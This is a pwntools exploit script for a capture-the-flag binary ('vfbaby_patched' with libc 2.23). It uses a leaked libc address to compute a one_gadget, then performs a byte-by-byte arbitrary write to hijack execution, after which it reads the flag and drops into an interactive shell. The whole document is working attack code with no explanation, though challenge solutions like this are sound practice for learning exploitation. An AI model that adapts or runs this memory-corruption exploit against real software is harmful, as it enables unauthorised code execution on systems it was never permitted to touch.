#!/bin/python
from pwn import *
exe = ELF('./vfbaby_patched')
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")
p = process(exe.path)
# context.terminal = ['foot']
# gdb.attach(p, gdbscript='''
# # b*0x555555400000+0x93a
# # b*0x555555400000+0x950
# # b*exit
# # b*0x00007ffff783a040
#            # b*0x7ffff7839fe1
#
#            ''')
#################exploiting####################cd
p.recvuntil(b'a gift ')
input()
addr = p.recvuntil(b',', drop=True)
leak_addr = int(addr, 16)
base_libc = leak_addr - 0xcc230
one_gadget = base_libc + 0xf02a4
write_addr = base_libc+0x626f48
part1_onegadget = one_gadget & 0xff
part2_onegadget = (one_gadget >> 8) & 0xff
part3_onegadget = (one_gadget >> 16) & 0xff
log.info(f'write_add: ' +  hex(write_addr))
log.info(f'leak_addr: ' +  hex(leak_addr))
log.info(f'one_gadget: ' +  hex(one_gadget))
log.info(f'base_libc: ' +  hex(base_libc))
xor2 = leak_addr+ 0x2f9a28 
xor1 = leak_addr 
push_rbp_ld = leak_addr + 3426432
log.info(f'push_rbp_ld: ' +  hex(push_rbp_ld))
log.info(f'xor1: ' +  hex(xor1))
log.info(f'xor2: ' +  hex(xor2))
# fini_arr = leak_addr + 7519696
# log.info(f'fini_arr: ' +  hex(fini_arr))
p.sendafter(b'good luck ;)',p64(write_addr))
input()
p.send(p64(part1_onegadget))
input()
p.send(p64(write_addr + 1))
input()
p.send(p64(part2_onegadget))
input()
p.send(p64(write_addr + 2))
input()
p.send(p64(part3_onegadget))
input()
p.sendline(b'cat flag > cac ')

##############the end###########################
p.interactive()
